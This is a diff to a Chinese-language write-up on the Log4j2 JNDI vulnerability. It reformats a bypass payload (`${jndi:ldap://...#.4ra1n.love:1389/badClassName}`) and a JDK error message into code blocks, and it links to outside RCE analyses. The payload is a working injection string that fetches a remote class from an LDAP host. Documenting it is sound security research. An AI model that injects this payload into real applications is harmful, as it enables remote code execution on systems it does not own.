@@ -177,7 +177,11 @@ Process finished with exit code 0
 
 #### Bypass攻击
 
-payload为`${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}`；
+payload：
+
+```
+${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}
+```
 
 具体的绕过以及RCE分析可参考[RCE](https://xz.aliyun.com/t/10689#toc-3)和[分析](https://xz.aliyun.com/t/10689#toc-4)；
 
@@ -185,7 +189,11 @@ payload为`${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}`；
 
 ## 限制
 
-- 目前暂时只知道jdk高版本会报错：`[main] ERROR log4j - Reference Class Name: foo`
+- 目前暂时只知道jdk高版本会报错：
+
+```
+[main] ERROR log4j - Reference Class Name: foo
+```
 
 这里本人没有测试，可以移步自行分析版本限制[bilibili @GCC酱_0ff1c1a1 Log4j2 漏洞风险演示与个人看法](https://www.bilibili.com/video/BV15Q4y1e7jZ)，也欢迎贡献本仓库。
 
